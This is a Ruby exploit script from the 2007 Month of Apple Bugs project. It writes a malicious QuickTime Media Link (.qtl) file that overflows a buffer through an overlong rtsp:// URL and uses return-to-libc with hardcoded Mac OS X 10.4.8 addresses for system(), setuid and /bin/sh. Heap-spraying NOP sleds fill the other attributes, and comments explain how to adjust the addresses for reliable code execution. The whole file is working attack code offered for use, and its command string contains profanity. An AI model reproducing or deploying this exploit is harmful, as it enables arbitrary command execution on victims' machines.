
#!/usr/bin/ruby
# Copyright (c) LMH <lmh [at] info-pull.com>
#               Kevin Finisterre <kf_lists [at] digitalmunition.com>
#
# Notes:
# Our command string is loaded on memory at a static address normally,
# but this depends on execution method and the string length. The address set in this exploit will
# be likely successful if we open the resulting QTL file directly, without having an
# instance of Quicktime running. Although, when using another method and string, you'll need
# to find the address.
# For 100% reliable exploitation you can always use the /bin/sh address,
# but that's not as a cool as having your box welcoming the new year.
# Do whatever you prefer. That said, enjoy.
# 
# see http://projects.info-pull.com/moab/MOAB-01-01-2007.html

# Command string: Use whatever you like.
# Remember that changing this will also need a change of the target address for system(),
# unless string length is the same.
CMD_STRING  = "/usr/bin/say Happy new year shit bag"

# Mac OS X 10.4.8 (8L2127)
EBP_ADDR    = 0xdeadbabe
SYSTEM_ADDR = 0x90046c30 # NX Wars: The Libc Strikes Back
SETUID_ADDR = 0x900334f0
CURL_ADDR   = 0x916c24bc # /usr/bin/curl
SHELL_ADDR  = 0x918bef3a # /bin/sh
CMDSTR_ADDR = [
                SHELL_ADDR, # 0 addr to static /bin/sh     (lame)
                0x017a053c, # 1 addr to our command string (cool) :> (change as necessary)
                0xbabeface, # 2 bogus addr for testing.
                CURL_ADDR   # 3 addr to '/usr/bin/curl'
              ]

# Payload. default to CMDSTR_ADDR 0 (/bin/sh)
HAPPY = ("A" * 299) +
        [EBP_ADDR].pack("V")    +
        [SYSTEM_ADDR].pack("V") +
        [SETUID_ADDR].pack("V") +
        [CMDSTR_ADDR[0]].pack("V")  # change array index for using diff. addr (see CMDSTR_ADDR)

# Sleds: not necessary if using /bin/bash addr or other built-in addresses.
# although, for using our own fu, we need to spray some data for better reliability
# the goal is causing allocation of large heap chunks
NEW   = ("\x90" * 30000) + CMD_STRING   # feed the heap
YEAR  = ("\x90" * 30000) + CMD_STRING   # go johnny, go
APPLE = ("\x90" * 30000) + "EOOM"       # feed the heap more
BOYZ  = ("\x90" * 30000) + "FOOM"       # and more

# QTL output template
QTL_CONTENT = "<?xml version=\"1.0\"?>" +
              "<?quicktime type=\"application/x-quicktime-media-link\"?>" +
              "<embed autoplay=\"true\" moviename=\"#{NEW}\" " +
              "qtnext=\"#{YEAR}\" type=\"video/quicktime#{APPLE}\" " +
              "src=\"rtsp://#{BOYZ}:#{HAPPY}\" />\n"

target_file = File.open("pwnage.qtl", "w+") { |f|
  f.print(QTL_CONTENT)
  f.close
}
